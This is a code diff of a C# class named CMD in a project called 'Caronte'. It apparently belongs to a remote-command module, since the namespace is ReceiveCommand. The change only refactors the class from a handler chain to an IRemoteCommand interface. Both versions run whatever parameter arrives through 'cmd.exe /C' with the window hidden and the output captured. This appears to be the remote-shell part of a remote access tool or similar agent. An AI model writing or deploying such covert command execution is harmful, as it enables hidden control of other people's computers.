@@ -1,5 +1,5 @@
-﻿using Barsa.Abstracts;
-using Barsa.Commons;
+﻿using Barsa.Commons;
+using Barsa.Interfaces;
 using Barsa.Models.Errors;
 using System;
 using System.Collections.Generic;
@@ -7,19 +7,16 @@ using System.Diagnostics;
 
 namespace Caronte.Modules.Command.ReceiveCommand.Commands
 {
-    public class CMD : AbstractHandler
+    public class CMD : IRemoteCommand
     {
-        public override CommonResponse Handle(CommandType commandType, object param)
+        public object Execute(object parameter)
         {
             CommonResponse response = new();
 
-            if (commandType != CommandType.CMD)
-                return base.Handle(commandType, param);
-
             try
             {
-                var processStartInfo = new ProcessStartInfo("cmd.exe", $"/C {Convert.ToString(param)}");
-                
+                var processStartInfo = new ProcessStartInfo("cmd.exe", $"/C {Convert.ToString(parameter)}");
+
                 processStartInfo.RedirectStandardOutput = true;
                 processStartInfo.UseShellExecute = false;
                 processStartInfo.CreateNoWindow = true;
@@ -37,6 +34,5 @@ namespace Caronte.Modules.Command.ReceiveCommand.Commands
 
             return response;
         }
-
     }
 }
